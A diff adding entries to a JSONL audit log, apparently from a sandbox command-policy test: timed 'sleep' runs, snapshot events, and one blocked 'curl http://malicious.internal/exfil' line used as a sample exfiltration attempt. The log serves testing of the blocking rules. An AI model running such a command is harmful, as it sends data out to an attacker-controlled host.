@@ -20,3 +20,10 @@
 {"ts": "2026-10-29T06:14:56.502976+00:00", "sandbox_name": "sbx-timeout01", "command": "sleep 100", "decision": "allow", "execution_target": "celesto_sandbox"}
 {"ts": "2026-10-29T06:15:42.664523+00:00", "sandbox_name": "sbx-timeout01", "command": "sleep 100", "decision": "allow", "execution_target": "celesto_sandbox"}
 {"ts": "2026-10-29T06:27:18.397790+00:00", "sandbox_name": "sbx-timeout01", "command": "sleep 100", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T06:37:22.813426+00:00", "sandbox_name": "sbx-timeout01", "command": "sleep 100", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T07:02:30.440852+00:00", "sandbox_name": "sbx-timeout01", "command": "sleep 100", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T07:13:59.049054+00:00", "sandbox_name": "sbx-timeout01", "command": "sleep 100", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T07:13:59.066956+00:00", "sandbox_name": "sbx-cbtest1", "command": "echo safe", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T07:13:59.071924+00:00", "sandbox_name": "sbx-cbtest2", "command": "curl http://malicious.internal/exfil", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T07:13:59.076793+00:00", "sandbox_name": "sbx-snap01", "command": "snapshot_created:snap-checkpoint-1", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-29T07:13:59.078650+00:00", "sandbox_name": "sbx-snap01-restored", "command": "snapshot_restored:snap-checkpoint-1", "decision": "allow", "execution_target": "celesto_sandbox"}
